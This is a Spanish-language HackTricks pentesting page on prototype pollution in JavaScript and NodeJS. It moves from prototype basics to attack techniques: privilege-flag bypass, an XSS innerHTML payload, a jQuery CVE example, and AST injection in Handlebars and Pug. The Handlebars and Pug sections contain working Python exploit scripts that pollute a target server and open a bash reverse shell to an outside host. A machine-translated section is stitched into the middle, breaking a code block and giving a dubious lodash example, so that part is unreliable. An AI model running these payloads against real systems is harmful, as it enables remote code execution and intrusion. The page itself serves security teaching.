# NodeJS - \_\_proto\_\_ y la contaminaci√≥n del prototipo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Objetos en JavaScript <a href="#053a" id="053a"></a>

En primer lugar, necesitamos entender `Object` en JavaScript. Un objeto es simplemente una colecci√≥n de pares clave-valor, a menudo llamados propiedades de ese objeto. Por ejemplo:

![](<../../../.gitbook/assets/image (389) (1).png>)

En JavaScript, `Object` es un objeto b√°sico, la plantilla para todos los objetos reci√©n creados. Es posible crear un objeto vac√≠o pasando `null` a `Object.create`. Sin embargo, el objeto reci√©n creado tambi√©n tendr√° un tipo que corresponde al par√°metro pasado y hereda todas las propiedades b√°sicas.
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

Anteriormente aprendimos que un objeto en javascript es una colecci√≥n de claves y valores, por lo que tiene sentido que un objeto `null` sea simplemente un diccionario vac√≠o: `{}`.

## Funciones / Clases en Javascript <a href="#55dd" id="55dd"></a>

En Javascript, los conceptos de clase y funci√≥n est√°n bastante interrelacionados (la funci√≥n en s√≠ act√∫a como el constructor de la clase y la naturaleza real no tiene concepto de "clase" en javascript). Veamos el siguiente ejemplo:
```javascript
function person(fullName, age) {
    this.age = age;
    this.fullName = fullName;
    this.details = function() {
        return this.fullName + " has age: " + this.age;
    }
}
```
![](<../../../.gitbook/assets/image (361).png>)

# Introducci√≥n

La contaminaci√≥n del prototipo es una vulnerabilidad que afecta a los lenguajes de programaci√≥n que admiten la herencia de prototipos, como JavaScript. Esta vulnerabilidad permite a un atacante modificar el prototipo de un objeto y, por lo tanto, cambiar el comportamiento de todas las instancias de ese objeto. En NodeJS, esta vulnerabilidad se puede explotar para lograr la ejecuci√≥n remota de c√≥digo.

# Descripci√≥n

La contaminaci√≥n del prototipo se produce cuando se permite a un usuario controlar la entrada que se utiliza para construir un objeto. Si el usuario puede controlar el valor de una propiedad del objeto que se utiliza para construir otros objetos, puede modificar el prototipo de esos objetos y, por lo tanto, cambiar su comportamiento.

En NodeJS, esta vulnerabilidad se puede explotar utilizando la funci√≥n `merge` de la biblioteca `lodash`. La funci√≥n `merge` se utiliza para combinar dos objetos en uno solo. Si uno de los objetos tiene una propiedad `__proto__` que apunta a un objeto malicioso, la propiedad `__proto__` del objeto resultante tambi√©n apuntar√° a ese objeto malicioso.

# Ejemplo

Considere el siguiente c√≥digo:

```javascript
const merge = require('lodash.merge');

const obj1 = {};
const obj2 = {a: 1};

merge(obj1, obj2);

console.log(obj1.a); // 1
```

En este ejemplo, `obj1` y `obj2` se combinan utilizando la funci√≥n `merge`. El resultado es que `obj1` ahora tiene una propiedad `a` con un valor de `1`.

Ahora, considere el siguiente c√≥digo malicioso:

```javascript
const merge = require('lodash.merge');

const obj1 = {};
const obj2 = {a: 1, __proto__: {x: () => console.log('exploited!')}};

merge(obj1, obj2);

console.log(obj1.a); // 1
obj1.x(); // "exploited!"
```

En este ejemplo, `obj2` tiene una propiedad `__proto__` que apunta a un objeto con una propiedad `x` que imprime un mensaje en la consola. Cuando `obj1` y `obj2` se combinan utilizando la funci√≥n `merge`, el resultado es que `obj1` ahora tiene una propiedad `a` con un valor de `1` y una propiedad `__proto__` que apunta al objeto malicioso. Por lo tanto, cuando se llama a `obj1.x()`, se imprime el mensaje "exploited!" en la consola.

# Prevenci√≥n

Para prevenir la contaminaci√≥n del prototipo, se deben seguir las siguientes pr√°cticas recomendadas:

- No conf√≠e en la entrada del usuario. Valide y filtre la entrada del usuario para asegurarse de que no contenga valores maliciosos.
- Utilice bibliotecas de confianza. Aseg√∫rese de que las bibliotecas que utiliza en su aplicaci√≥n sean seguras y est√©n actualizadas.
- Evite el uso de la funci√≥n `__proto__`. En su lugar, utilice la funci√≥n `Object.create()` para crear objetos con prototipos personalizados.
```javascript
var person1 = new person("Satoshi", 70);
```
## Prototipos en JavaScript <a href="#3843" id="3843"></a>

Una cosa a tener en cuenta es que el atributo de prototipo puede ser cambiado/modificado/eliminado al ejecutar el c√≥digo. Por ejemplo, las funciones de la clase pueden ser a√±adidas din√°micamente:

![](<../../../.gitbook/assets/image (363).png>)

Las funciones de la clase tambi√©n pueden ser modificadas (como `toString` o `valueOf` en los siguientes casos):

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## Herencia

En un programa basado en prototipos, los objetos heredan propiedades/m√©todos de las clases. Las clases se derivan a√±adiendo propiedades/m√©todos a una instancia de otra clase o a√±adi√©ndolos a un objeto vac√≠o.

Tenga en cuenta que, si se a√±ade una propiedad a un objeto que se utiliza como prototipo para un conjunto de objetos (como el myPersonObj), los objetos para los que es el prototipo tambi√©n obtienen la nueva propiedad, pero esa propiedad no se imprime a menos que se llame espec√≠ficamente.

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_ pollution <a href="#0d0a" id="0d0a"></a>

Ya deber√≠a haber aprendido que **cada objeto en JavaScript es simplemente una colecci√≥n de pares clave y valor** y que **cada objeto hereda del tipo Object en JavaScript**. Esto significa que si se puede contaminar el tipo Object, **¬°cada objeto JavaScript del entorno va a estar contaminado!**

Esto es bastante simple, s√≥lo se necesita ser capaz de modificar algunas propiedades (pares clave-valor) de un objeto JavaScript arbitrario, porque como cada objeto hereda de Object, cada objeto puede acceder al esquema de Object.
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
Del ejemplo anterior, es posible acceder a la estructura de un objeto utilizando las siguientes formas:
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
Como se mencion√≥ anteriormente, si ahora se agrega una propiedad al esquema de Object, todos los objetos JavaScript tendr√°n acceso a la nueva propiedad:
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
Entonces, cada objeto JS contendr√° las nuevas propiedades: la funci√≥n `printHello` y la nueva constante `globalconstant`.

## Poluci√≥n de prototipos

Esta t√©cnica no es tan efectiva como la anterior, ya que no se puede contaminar el esquema del objeto JS. Pero en casos donde la **palabra clave `__proto__` est√° prohibida, esta t√©cnica puede ser √∫til**.

Si puedes modificar las propiedades de una funci√≥n, puedes modificar la propiedad `prototype` de la funci√≥n y **cada nueva propiedad que agregues aqu√≠ ser√° heredada por cada objeto creado a partir de esa funci√≥n:**
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
En este caso solo los **objetos creados a partir de la clase `person`** se ver√°n afectados, pero cada uno de ellos heredar√° las propiedades `sayHello` y `newConstant`.

**Hay 2 formas de abusar de la contaminaci√≥n del prototipo para envenenar CADA objeto JS.**

La primera ser√≠a contaminar la propiedad prototipo de **Object** (como se mencion√≥ anteriormente, cada objeto JS hereda de este):
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
Si logras hacer eso, cada objeto JS podr√° ejecutar la funci√≥n `sayBye`.

La otra forma es envenenar el prototipo de un constructor de una variable de diccionario como en el siguiente ejemplo:
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
Despu√©s de ejecutar ese c√≥digo, **cada objeto JS podr√° ejecutar la funci√≥n `sayHey`**.

## Contaminando otros objetos

### Desde una clase a Object.prototype

En un escenario donde puedes **contaminar un objeto espec√≠fico** y necesitas **llegar a `Object.prototype`**, puedes buscarlo con algo como el siguiente c√≥digo:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
  if (window[key]?.constructor.prototype === Object.prototype) {
    console.log(key)
  }
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
  for(let key2 in document.querySelector('a')[key1]) {
    if (document.querySelector('a')[key1][key2] === window) {
      console.log(key1 + "." + key2)
    }
  }
}
```
### Contaminaci√≥n de elementos de un array

Tenga en cuenta que, al igual que puede contaminar atributos de objetos en JS, si tiene acceso para contaminar un array, tambi√©n puede **contaminar los valores del array** accesibles **por √≠ndices** (tenga en cuenta que no puede sobrescribir valores, por lo que debe contaminar √≠ndices que se usan de alguna manera pero no se escriben).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Contaminaci√≥n de elementos HTML

Al generar un elemento HTML a trav√©s de JS, es posible **sobrescribir** el atributo **`innerHTML`** para hacer que escriba **c√≥digo HTML arbitrario**. [Idea y ejemplo de este art√≠culo](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Ejemplos

### Ejemplo B√°sico

¬øD√≥nde est√° la contaminaci√≥n del prototipo? Ocurre cuando hay un error en la aplicaci√≥n que permite sobrescribir propiedades de `Object.prototype`. Dado que cada objeto t√≠pico hereda sus propiedades de `Object.prototype`, podemos cambiar el comportamiento de la aplicaci√≥n. El ejemplo m√°s com√∫nmente mostrado es el siguiente:
```javascript
if (user.isAdmin) {   // do something important!}
```
Imagina que tenemos una contaminaci√≥n de prototipos que hace posible establecer `Object.prototype.isAdmin = true`. Entonces, a menos que la aplicaci√≥n asigne expl√≠citamente alg√∫n valor, ¬°`user.isAdmin` siempre es verdadero!

Por ejemplo, `obj[a][b] = value`. Si el atacante puede controlar el valor de `a` y `value`, entonces solo necesita ajustar el valor de `a` a `__proto__` (en javascript, `obj["__proto__"]` y `obj.__proto__` son completamente equivalentes) y la propiedad `b` de todos los objetos existentes en la aplicaci√≥n se asignar√° a `value`.

Sin embargo, el ataque no es tan simple como el anterior, seg√∫n [el documento](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), solo podemos atacar cuando se cumple una de las siguientes tres condiciones:

* Realizar una fusi√≥n recursiva
* Definici√≥n de propiedad por ruta
* Clonar objeto

### Anulaci√≥n de funci√≥n
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution para RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Proto Pollution del lado del cliente para XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Ataque de Proto Pollution a trav√©s de jQuery $ .extend

$ .extend, si se maneja incorrectamente, puede cambiar las propiedades del objeto `prototype` (la plantilla de los objetos en la aplicaci√≥n). Esta propiedad luego aparecer√° en todos los objetos. Tenga en cuenta que solo la versi√≥n "profunda" (es decir, g) de $ .extened se ve afectada.

Los programadores a menudo usan esta funci√≥n para duplicar un objeto o completar nuevas propiedades a partir de un objeto predeterminado. Por ejemplo:

Podemos imaginar que `myObject` es un campo de entrada del usuario y se serializa en la base de datos.

En este c√≥digo, a menudo pensamos que, al ejecutarlo, se asignar√° el atributo `isAdmin` al objeto reci√©n creado. Pero esencialmente, se asigna directamente a `{}` y luego `{}.isAdmin` ser√° `true`. Si despu√©s de este c√≥digo, realizamos la siguiente verificaci√≥n:
```javascript
If (user.isAdmin === true) {
    // do something for admin
}
```
Si el usuario a√∫n no existe (`undefined`), se buscar√° la propiedad `isAdmin` en su objeto padre, que es el objeto al que se le agreg√≥ `isAdmin` con el valor `true` anteriormente.

Otro ejemplo cuando se ejecuta en JQuery 3.3.1:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
Estos errores pueden afectar a muchos proyectos de Javascript, especialmente a proyectos de NodeJS, el ejemplo m√°s pr√°ctico es el error en Mongoose, la biblioteca JS que ayuda a manipular MongoDB, en diciembre de 2018.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Ataque de poluci√≥n de prototipos a trav√©s de lodash

[Lodash](https://www.npmjs.com/package/lodash) es tambi√©n una biblioteca bien conocida que proporciona muchas funciones diferentes, ayud√°ndonos a escribir c√≥digo de manera m√°s conveniente y ordenada con m√°s de 19 millones de descargas semanales. Y tuvo el mismo problema que JQuery.

**CVE-2018‚Äì3721**

**CVE-2019‚Äì10744**

Este error afecta a todas las versiones de Lodash, ya corregido en la versi√≥n 4.17.11.

### Otro tutorial con CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## Poluci√≥n de prototipos AST

En NodeJS, AST se utiliza en JS muy a menudo, como motores de plantillas y typescript, etc.\
Para el motor de plantillas, la estructura es como se muestra arriba.

![img](https://blog.p6.is/img/2020/08/graph\_3.jpg)

### Handlebars

Informaci√≥n tomada de [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

Puede insertar cualquier cadena en `Object.prototype.pendingContent` para determinar la posibilidad de un ataque.\
Esto le permite estar seguro de que los servidores est√°n utilizando el motor de Handlebars cuando existe una poluci√≥n de prototipos en un entorno de caja negra.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
	if (this.pendingContent) {
		content = this.pendingContent + content;
	} else {
		this.pendingLocation = this.source.currentLocation;
	}

	this.pendingContent = content;
},
pushSource: function pushSource(source) {
	if (this.pendingContent) {
		this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
		this.pendingContent = undefined;
	}

	if (source) {
		this.source.push(source);
	}
}
...
```
Esto se realiza mediante la funci√≥n `appendContent` de `javascript-compiler.js`. `appendContent` es as√≠. Si `pendingContent` est√° presente, se agrega al contenido y se devuelve.

`pushSource` hace que `pendingContent` sea `undefined`, evitando que la cadena se inserte varias veces.

**Explotaci√≥n**

![img](https://blog.p6.is/img/2020/08/graph\_5.jpg)

Handlebars funciona como se muestra en el gr√°fico anterior.

Despu√©s de que el lexer y el parser generan el AST, se pasa a `compiler.js`. Podemos ejecutar la funci√≥n de plantilla que el compilador gener√≥ con algunos argumentos. Y devuelve la cadena como "Hello posix" (cuando msg es posix).
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
    this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
    break;
```
El analizador en handlebars fuerza que el valor de un nodo cuyo tipo es NumberLiteral siempre sea un n√∫mero a trav√©s del constructor Number. Sin embargo, puedes insertar una cadena no num√©rica aqu√≠ utilizando la contaminaci√≥n del prototipo.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
  // Just return if an already-compiled AST was passed in.
  if (input.type === 'Program') {
    return input;
  }

  _parser2['default'].yy = yy;

  // Altering the shared object here, but this is ok as parser is a sync operation
  yy.locInfo = function (locInfo) {
    return new yy.SourceLocation(options && options.srcName, locInfo);
  };

  var ast = _parser2['default'].parse(input);

  return ast;
}

function parse(input, options) {
  var ast = parseWithoutProcessing(input, options);
  var strip = new _whitespaceControl2['default'](options);

  return strip.accept(ast);
}
```
Primero, observa la funci√≥n de compilaci√≥n, la cual admite dos formas de entrada, un objeto AST y una cadena de plantilla.

Cuando el tipo de entrada es `Program`, aunque el valor de entrada es en realidad una cadena.\
El analizador considera que ya ha sido analizado por parser.js y lo env√≠a al compilador sin ning√∫n procesamiento adicional.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
    /* istanbul ignore next: Sanity code */
    if (!this[node.type]) {
        throw new _exception2['default']('Unknown type: ' + node.type, node);
    }

    this.sourceNode.unshift(node);
    var ret = this[node.type](node);
    this.sourceNode.shift();
    return ret;
},
Program: function Program(program) {
    console.log((new Error).stack)
    this.options.blockParams.unshift(program.blockParams);

    var body = program.body,
        bodyLength = body.length;
    for (var i = 0; i < bodyLength; i++) {
        this.accept(body[i]);
    }

    this.options.blockParams.shift();

    this.isSimple = bodyLength === 1;
    this.blockParams = program.blockParams ? program.blockParams.length : 0;

    return this;
}
```
El compilador toma el objeto AST (en realidad una cadena) y lo env√≠a al m√©todo `accept`.\
Y `accept` llama a `this[node.type]` del compilador.\
Luego toma el atributo `body` del AST y lo utiliza para construir la funci√≥n.
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
        "type": "NumberLiteral",
        "value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
    }],
    "loc": {
        "start": 0,
        "end": 0
    }
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
    var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
            return parent[propertyName];
        }
        return undefined
    };

    return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
        "name": "undefined",
        "hash": {},
        "data": data,
        "loc": {
            "start": 0,
            "end": 0
        }
    })) != null ? stack1 : "");
}
*/
```
Como resultado, un ataque puede ser configurado de la siguiente manera. Si se ha pasado por el analizador, se especifica una cadena que no puede ser asignada al valor de NumberLiteral. Pero si se procesa el AST inyectado, podemos insertar cualquier c√≥digo en la funci√≥n.

**Ejemplo**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

# execute
requests.get(TARGET_URL)
```
### Pug

M√°s informaci√≥n en [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
})

# execute
requests.get(TARGET_URL)
```
## ¬øQu√© puedo hacer para prevenir?

* Congelar propiedades con Object.freeze (Object.prototype)
* Realizar validaci√≥n en las entradas JSON de acuerdo con el esquema de la aplicaci√≥n
* Evitar el uso de funciones de fusi√≥n recursiva de manera insegura
* Usar objetos sin propiedades de prototipo, como `Object.create(null)`, para evitar afectar la cadena de prototipos
* Usar `Map` en lugar de `Object`
* Actualizar regularmente nuevos parches para las bibliotecas

## Referencia

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
